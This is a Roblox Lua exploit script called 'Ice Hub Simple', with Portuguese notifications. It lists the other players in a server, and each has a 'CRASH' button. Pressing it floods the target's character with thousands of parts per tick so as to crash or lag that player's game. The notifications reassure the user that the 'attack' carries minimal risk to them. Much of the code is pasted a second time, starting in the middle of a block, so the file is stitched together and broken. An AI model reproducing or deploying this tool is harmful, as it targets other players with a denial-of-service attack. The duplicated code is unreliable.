Local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.ResetOnSpawn = false
gui.Parent = plr:WaitForChild("PlayerGui")

local minimized = false

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 340, 0, 400)
main.Position = UDim2.new(0.5, -170, 0.5, -200)
main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
main.Parent = gui
local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 18)
mainCorner.Parent = main

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -100, 0, 50)
title.Position = UDim2.new(0, 15, 0, 0)
title.BackgroundTransparency = 1
title.Text = "Ice Hub Simple"
title.TextColor3 = Color3.new(1, 1, 1)
title.TextXAlignment = Enum.TextXAlignment.Left
title.Font = Enum.Font.GothamBold
title.TextSize = 28
title.Parent = main

local minBtn = Instance.new("TextButton")
minBtn.Size = UDim2.new(0, 40, 0, 40)
minBtn.Position = UDim2.new(1, -85, 0, 5)
minBtn.BackgroundTransparency = 1
minBtn.Text = "−"
minBtn.TextColor3 = Color3.new(1, 1, 1)
minBtn.TextSize = 30
minBtn.Font = Enum.Font.GothamBold
minBtn.Parent = main

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 40, 0, 40)
closeBtn.Position = UDim2.new(1, -45, 0, 5)
closeBtn.BackgroundTransparency = 1
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.new(1, 1, 1)
closeBtn.TextSize = 30
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = main
closeBtn.MouseButton1Click:Connect(function()
    gui:Destroy()
end)

local listFrame = Instance.new("ScrollingFrame")
listFrame.Size = UDim2.new(1, -30, 1, -70)
listFrame.Position = UDim2.new(0, 15, 0, 60)
listFrame.BackgroundTransparency = 1
listFrame.ScrollBarThickness = 6
listFrame.Parent = main

local function attemptCrash(targetPlayer)
    local targetCharacter = targetPlayer.Character
    
    if targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart") then
        game.StarterGui:SetCore("SendNotification", {Title = "Ice Hub Simple", Text = "Iniciando ataque de CRASH focado em " .. targetPlayer.Name .. ". (Risco mínimo para você).", Duration = 3})

        local partsToSpam = 5000
        local crashTime = 5
        
        task.spawn(function()
            local startTime = tick()
            local debris = game:GetService("Debris")
            
            while tick() - startTime < crashTime do
                local partsContainer = Instance.new("Folder")
                partsContainer.Name = "CRASH_DATA_" .. targetPlayer.Name
                partsContainer.Parent = targetCharacter 
                
                for i = 1, partsToSpam do
                    local part = Instance.new("Part")
                    part.Name = "CrashPart"
                    part.Size = Vector3.new(1, 1, 1)
                    part.Transparency = 0.8
                    part.Anchored = false
                    part.CanCollide = false
                    part.Parent = partsContainer
                    
                    debris:AddItem(part, 0.1) 
                end
                
                debris:AddItem(partsContainer, 0.5) 
                
                task.wait(0.05) 
            end
            
            game.StarterGui:SetCore("SendNotification", {Title = "Ice Hub Simple", Text = "Ataque de CRASH em " .. targetPlayer.Name .. " finalizado.", Duration = 3})
        end)
    else
         game.StarterGui:SetCore("SendNotification", {Title = "Ice Hub Simple", Text = targetPlayer.Name .. " não tem um personagem válido para crashar.", Duration = 3})
    end
end

local function updateList()
    for _, child in pairs(listFrame:GetChildren()) do
        if child:IsA("Frame") then child:Destroy() end
    end

    local y = 0
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= plr then
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(1, -10, 0, 60)
            frame.Position = UDim2.new(0, 0, 0, y)
            frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            frame.Parent = listFrame
            Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

            local name = Instance.new("TextLabel")
            name.Size = UDim2.new(0.7, 0, 1, 0)
            name.BackgroundTransparency = 1
            name.Text = player.Name
            name.TextColor3 = Color3.new(1, 1, 1)
            name.TextSize = 22
            name.Font = Enum.Font.GothamBold
            name.TextXAlignment = "Left"
            name.Position = UDim2.new(0, 15, 0, 0)
            name.Parent = frame

            local crashBtn = Instance.new("TextButton")
            crashBtn.Size = UDim2.new(0, 100, 0, 40)
            crashBtn.Position = UDim2.new(1, -110, 0.5, -20)
            crashBtn.BackgroundColor3 = Color3.fromRGB(255, 60, 60) 
            crashBtn.Text = "CRASH" 
            crashBtn.TextColor3 = Color3.new(1, 1, 1)
            crashBtn.TextSize = 22
            crashBtn.Font = Enum.Font.GothamBold
            crashBtn.Parent = frame
            Instance.new("UICorner", crashBtn).CornerRadius = UDim.new(0, 12)

            crashBtn.MouseButton1Click:Connect(function()
                attemptCrash(player)
            end)

            y = y + 70
        end
    end

    listFrame.CanvasSize = UDim2.new(0, 0, 0, y)
end

spawn(function()
    while true do
        updateList()
        task.wait(2)
    end
end)

minBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    listFrame.Visible = not minimized
    minBtn.Text = minimized and "+" or "−"
end)

Players.PlayerAdded:Connect(updateList)
Players.PlayerRemoving:Connect(updateList)

game.StarterGui:SetCore("SendNotification", {Title = "Ice Hub Simple", Text = "Carregado! Todos listados", Duration = 5})
minBtn.TextColor3 = Color3.new(1, 1, 1)
minBtn.TextSize = 30
minBtn.Font = Enum.Font.GothamBold
minBtn.Parent = main

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 40, 0, 40)
closeBtn.Position = UDim2.new(1, -45, 0, 5)
closeBtn.BackgroundTransparency = 1
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.new(1, 1, 1)
closeBtn.TextSize = 30
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = main
closeBtn.MouseButton1Click:Connect(function()
    gui:Destroy()
end)

local listFrame = Instance.new("ScrollingFrame")
listFrame.Size = UDim2.new(1, -30, 1, -70)
listFrame.Position = UDim2.new(0, 15, 0, 60)
listFrame.BackgroundTransparency = 1
listFrame.ScrollBarThickness = 6
listFrame.Parent = main

-- Função de Crash Agressiva, Anexada ao Alvo
local function attemptCrash(targetPlayer)
    local targetCharacter = targetPlayer.Character
    
    if targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart") then
        game.StarterGui:SetCore("SendNotification", {Title = "Ice Hub Simple", Text = "Iniciando ataque de CRASH focado em " .. targetPlayer.Name .. ". (Risco mínimo para você).", Duration = 3})

        local partsToSpam = 5000 -- Número de peças por iteração
        local crashTime = 5 -- Duração do ataque em segundos
        
        task.spawn(function()
            local startTime = tick()
            local debris = game:GetService("Debris")
            
            while tick() - startTime < crashTime do
                local partsContainer = Instance.new("Folder")
                partsContainer.Name = "CRASH_DATA_" .. targetPlayer.Name
                partsContainer.Parent = targetCharacter 
                
                for i = 1, partsToSpam do
                    local part = Instance.new("Part")
                    part.Name = "CrashPart"
                    part.Size = Vector3.new(1, 1, 1)
                    part.Transparency = 0.8 -- Quase transparente, mas força um pouco a renderização
                    part.Anchored = false
                    part.CanCollide = false
                    part.Parent = partsContainer
                    
                    -- Adiciona rapidamente ao Debris para ser destruído
                    debris:AddItem(part, 0.1) 
                end
                
                -- Destrói a pasta após o spam
                debris:AddItem(partsContainer, 0.5) 
                
                task.wait(0.05) 
            end
            
            game.StarterGui:SetCore("SendNotification", {Title = "Ice Hub Simple", Text = "Ataque de CRASH em " .. targetPlayer.Name .. " finalizado.", Duration = 3})
        end)
    else
         game.StarterGui:SetCore("SendNotification", {Title = "Ice Hub Simple", Text = targetPlayer.Name .. " não tem um personagem válido para crashar.", Duration = 3})
    end
end

local function updateList()
    for _, child in pairs(listFrame:GetChildren()) do
        if child:IsA("Frame") then child:Destroy() end
    end

    local y = 0
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= plr then
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(1, -10, 0, 60)
            frame.Position = UDim2.new(0, 0, 0, y)
            frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            frame.Parent = listFrame
            Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

            local name = Instance.new("TextLabel")
            name.Size = UDim2.new(0.7, 0, 1, 0)
            name.BackgroundTransparency = 1
            name.Text = player.Name
            name.TextColor3 = Color3.new(1, 1, 1)
            name.TextSize = 22
            name.Font = Enum.Font.GothamBold
            name.TextXAlignment = "Left"
            name.Position = UDim2.new(0, 15, 0, 0)
            name.Parent = frame

            local crashBtn = Instance.new("TextButton")
            crashBtn.Size = UDim2.new(0, 100, 0, 40)
            crashBtn.Position = UDim2.new(1, -110, 0.5, -20)
            crashBtn.BackgroundColor3 = Color3.fromRGB(255, 60, 60) 
            crashBtn.Text = "CRASH" 
            crashBtn.TextColor3 = Color3.new(1, 1, 1)
            crashBtn.TextSize = 22
            crashBtn.Font = Enum.Font.GothamBold
            crashBtn.Parent = frame
            Instance.new("UICorner", crashBtn).CornerRadius = UDim.new(0, 12)

            crashBtn.MouseButton1Click:Connect(function()
                attemptCrash(player)
            end)

            y = y + 70
        end
    end

    listFrame.CanvasSize = UDim2.new(0, 0, 0, y)
end

spawn(function()
    while true do
        updateList()
        task.wait(2)
    end
end)

minBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    listFrame.Visible = not minimized
    minBtn.Text = minimized and "+" or "−"
end)

Players.PlayerAdded:Connect(updateList)
Players.PlayerRemoving:Connect(updateList)

game.StarterGui:SetCore("SendNotification", {Title = "Ice Hub Simple", Text = "Carregado! Todos listados", Duration = 5})
